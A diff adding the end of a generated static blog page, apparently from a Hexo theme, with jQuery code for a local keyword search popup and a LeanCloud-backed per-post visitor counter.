+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("KVNdpVifyFqJPx0bzSg6cN7z-gzGzoHsz", "vlNRwqLbdUTKC1W06gjYj0iG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
